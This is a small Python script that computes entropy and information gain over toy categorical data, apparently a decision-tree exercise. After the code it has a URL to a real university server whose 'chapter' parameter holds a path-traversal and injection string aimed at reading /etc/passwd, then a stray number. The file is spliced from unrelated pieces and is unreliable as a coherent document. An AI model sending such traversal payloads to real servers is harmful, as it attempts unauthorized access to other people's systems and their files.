import math
import numpy as np
import matplotlib.pyplot as plt

y =             [0, 1, 0, 1, 1, 1, 0, 0] # 0 = low, 1 = high
licenseTime =   [0, 1, 2, 0, 2, 0, 1, 1] # 0 = 1-2, 1 = 2-7, 2 = >7
gender =        [0, 0, 1, 1, 0, 0, 1, 0] # m = 0, f = 1
area =          [0, 1, 1, 1, 1, 1, 0, 0] # urban = 0, rural = 1

entropy = lambda pos, neg: -pos * (math.log2(pos) if pos else 0) - neg * (math.log2(neg) if neg else 0)
enum = lambda l, v, y, y0: len([x for i, x in enumerate(l) if x == v and y[i] == y0]) / l.count(v) if l.count(v) else 0
e = entropy(y.count(1) / len(y), y.count(0) / len(y))
informationGain = lambda a, values, y, add_a=0, add_y=0: e - sum([entropy(enum(a, i + add_a, y, 1 + add_y), enum(a, i + add_a, y, 0 + add_y)) * (a.count(i) / len(a)) for i in range(values)])

print(informationGain(area, 2, y))
print(informationGain(licenseTime, 3, area, 1))

print(informationGain(gender, 2, licenseTime))
print(informationGain(gender, 2, licenseTime, 0, 1))
print(informationGain(area, 2, licenseTime))
print(informationGain(area, 2, licenseTime, 0, 1))
#print(informationGain(licenseTime, 3, area, 1))


https://cs.gmu.edu/~kdobolyi/sparc/createCode.php?user=sparc_VAUK07TX123456780&chapter=../../../../../etc/passwd);//&problem=

7039938870